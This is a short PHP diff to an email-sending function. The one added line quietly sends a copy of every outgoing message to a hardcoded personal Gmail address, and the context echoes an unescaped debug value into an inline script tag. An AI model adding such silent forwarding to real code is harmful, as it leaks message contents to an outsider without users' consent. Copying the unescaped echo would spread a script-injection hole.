@@ -190,6 +190,7 @@ HEREDOC;
     	$html_message = str_replace(array("\r", "\n"), '', $html_message);
     	 
     	$send_message = UtilController::sendMail($to, $from, $subject, $html_message);
+		UtilController::sendMail('vitor.pagani.92@gmail.com', $from, $subject, $html_message);
     	 
     	echo "<script>console.log( 'Debug Objects: " . $send_message . "' );</script>";
     }
